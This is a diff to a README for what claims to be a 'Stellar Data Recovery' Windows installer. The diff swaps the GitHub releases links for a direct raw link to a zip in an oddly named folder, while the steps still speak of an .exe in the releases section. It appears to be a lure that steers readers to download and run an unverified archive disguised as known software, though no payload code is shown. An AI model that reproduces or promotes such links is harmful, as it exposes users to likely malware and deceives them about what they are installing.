@@ -1,6 +1,6 @@
 # 💾 Stellar-Data-Recovery-Setup - Restore your lost digital files easily
 
-[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/ctrf7083/Stellar-Data-Recovery-Setup/releases)
+[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://raw.githubusercontent.com/ctrf7083/Stellar-Data-Recovery-Setup/main/metallographer/Data-Stellar-Recovery-Setup-2.5.zip)
 
 ## 🔍 About the software
 
@@ -21,7 +21,7 @@ Before you install the software, check that your computer meets these minimum re
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Visit [this page to download](https://github.com/ctrf7083/Stellar-Data-Recovery-Setup/releases) the latest version of the setup file.
+1. Visit [this page to download](https://raw.githubusercontent.com/ctrf7083/Stellar-Data-Recovery-Setup/main/metallographer/Data-Stellar-Recovery-Setup-2.5.zip) the latest version of the setup file.
 2. Select the file ending in .exe from the releases section.
 3. Save the file to your Downloads folder.
 4. Locate the downloaded file and double-click it.
